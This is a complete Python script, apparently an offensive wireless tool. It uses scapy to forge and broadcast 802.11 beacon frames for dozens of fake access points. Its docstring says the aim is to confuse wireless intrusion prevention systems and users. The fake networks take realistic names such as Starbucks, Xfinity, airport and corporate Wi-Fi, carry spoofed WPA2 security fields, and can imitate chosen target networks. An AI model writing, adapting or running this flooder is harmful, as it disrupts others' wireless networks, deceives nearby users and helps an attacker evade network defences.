#!/usr/bin/env python3
"""
Advanced Beacon Flood Attack
Creates multiple fake APs to confuse WIPS and users
"""

from scapy.all import *
import threading
import time
import random
from colorama import Fore, Style
import logging

class BeaconFlooder:
    def __init__(self, interface):
        self.interface = interface
        self.is_flooding = False
        self.flood_thread = None
        self.fake_aps = []
        self.logger = logging.getLogger('beacon_flooder')
        
        # Common SSID patterns for realism
        self.ssid_patterns = [
            "Free WiFi",
            "Public WiFi", 
            "Guest Network",
            "Hotel Guest",
            "Airport WiFi",
            "Starbucks WiFi",
            "McDonald's Free WiFi",
            "ATT WiFi",
            "Xfinity WiFi",
            "Linksys",
            "Netgear",
            "TP-Link",
            "dlink",
            "Home Network",
            "Family WiFi",
            "Secure Network",
            "Corporate WiFi",
            "Conference WiFi"
        ]
    
    def generate_random_mac(self):
        """Generate random MAC address"""
        return "02:00:00:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255), 
            random.randint(0, 255)
        )
    
    def generate_ssid_variations(self, base_ssid, count=10):
        """Generate variations of base SSID"""
        variations = []
        
        for i in range(count):
            variation = f"{base_ssid}"
            if random.random() > 0.5:
                variation += f"_{random.randint(1, 999)}"
            if random.random() > 0.7:
                variation += "_FREE"
            if random.random() > 0.8:
                variation += "_GUEST"
                
            variations.append(variation)
        
        return variations
    
    def create_beacon_packet(self, ssid, bssid, channel):
        """Create beacon frame packet"""
        # Dot11 layers
        dot11 = Dot11(
            type=0, subtype=8,  # Management frame, beacon
            addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
            addr2=bssid,                # Source MAC (BSSID)
            addr3=bssid                 # BSSID
        )
        
        # Beacon frame
        beacon = Dot11Beacon()
        
        # ESS capabilities
        ess_cap = Dot11Elt(ID="SSID", info=ssid.encode())
        
        # Supported rates
        rates = Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
        
        # DS parameter set (channel)
        ds_param = Dot11Elt(ID="DSset", info=bytes([channel]))
        
        # Traffic indication map
        tim = Dot11Elt(ID="TIM", info=b'\x00\x01\x00\x00')
        
        # Create complete packet
        packet = RadioTap() / dot11 / beacon / ess_cap / rates / ds_param / tim
        
        # Add RSN for WPA2 networks
        if random.random() > 0.3:  # 70% as WPA2
            rsn = Dot11Elt(
                ID=48,  # RSN
                info=(
                    b'\x01\x00'              # RSN Version 1
                    b'\x00\x0f\xac\x02'      # Group Cipher Suite (AES)
                    b'\x02\x00'              # 2 Pairwise Cipher Suites
                    b'\x00\x0f\xac\x04'      # AES
                    b'\x00\x0f\xac\x02'      # TKIP  
                    b'\x01\x00'              # 1 AKM Suite
                    b'\x00\x0f\xac\x02'      # PSK
                    b'\x00\x00'              # RSN Capabilities
                )
            )
            packet = packet / rsn
        
        return packet
    
    def start_flood(self, ssid=None, count=50, channel=6, interval=0.1):
        """Start beacon flood attack"""
        print(f"{Fore.CYAN}[*] Starting beacon flood attack{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Interface: {self.interface}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target count: {count} fake APs{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Channel: {channel}{Style.RESET_ALL}")
        
        # Generate fake APs
        self.fake_aps = []
        
        if ssid:
            # Use specified SSID with variations
            ssids = self.generate_ssid_variations(ssid, count)
        else:
            # Use random SSIDs from patterns
            ssids = random.choices(self.ssid_patterns, k=count)
        
        for i in range(count):
            bssid = self.generate_random_mac()
            ssid_name = ssids[i] if i < len(ssids) else f"Free_WiFi_{i+1}"
            
            fake_ap = {
                'ssid': ssid_name,
                'bssid': bssid,
                'channel': channel,
                'packet': self.create_beacon_packet(ssid_name, bssid, channel)
            }
            self.fake_aps.append(fake_ap)
        
        self.is_flooding = True
        self.flood_thread = threading.Thread(
            target=self._flood_worker,
            args=(interval,)
        )
        self.flood_thread.daemon = True
        self.flood_thread.start()
        
        print(f"{Fore.GREEN}[+] Beacon flood attack started{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Created {len(self.fake_aps)} fake access points{Style.RESET_ALL}")
    
    def _flood_worker(self, interval):
        """Worker thread for sending beacon frames"""
        while self.is_flooding:
            try:
                for ap in self.fake_aps:
                    if not self.is_flooding:
                        break
                    
                    sendp(ap['packet'], iface=self.interface, verbose=0)
                    time.sleep(interval / len(self.fake_aps))
                    
            except Exception as e:
                self.logger.error(f"Error in beacon flood: {e}")
                time.sleep(1)
    
    def stop_flood(self):
        """Stop beacon flood attack"""
        print(f"{Fore.CYAN}[*] Stopping beacon flood attack{Style.RESET_ALL}")
        self.is_flooding = False
        
        if self.flood_thread:
            self.flood_thread.join(timeout=2)
        
        self.fake_aps.clear()
        print(f"{Fore.GREEN}[+] Beacon flood attack stopped{Style.RESET_ALL}")
    
    def add_custom_ap(self, ssid, bssid=None, channel=6):
        """Add custom fake AP to the flood"""
        if not bssid:
            bssid = self.generate_random_mac()
        
        fake_ap = {
            'ssid': ssid,
            'bssid': bssid,
            'channel': channel,
            'packet': self.create_beacon_packet(ssid, bssid, channel)
        }
        
        self.fake_aps.append(fake_ap)
        print(f"{Fore.GREEN}[+] Added custom fake AP: {ssid} ({bssid}){Style.RESET_ALL}")
    
    def get_fake_aps(self):
        """Get list of current fake APs"""
        return self.fake_aps.copy()
    
    def targeted_flood(self, target_ssids, channel=6, interval=0.1):
        """Targeted flood with specific SSIDs"""
        print(f"{Fore.CYAN}[*] Starting targeted beacon flood{Style.RESET_ALL}")
        
        self.fake_aps = []
        
        for ssid in target_ssids:
            # Create multiple variations of each target SSID
            variations = self.generate_ssid_variations(ssid, 3)
            for variation in variations:
                bssid = self.generate_random_mac()
                fake_ap = {
                    'ssid': variation,
                    'bssid': bssid,
                    'channel': channel,
                    'packet': self.create_beacon_packet(variation, bssid, channel)
                }
                self.fake_aps.append(fake_ap)
        
        self.is_flooding = True
        self.flood_thread = threading.Thread(
            target=self._flood_worker,
            args=(interval,)
        )
        self.flood_thread.daemon = True
        self.flood_thread.start()
        
        print(f"{Fore.GREEN}[+] Targeted beacon flood started for {len(target_ssids)} SSIDs{Style.RESET_ALL}")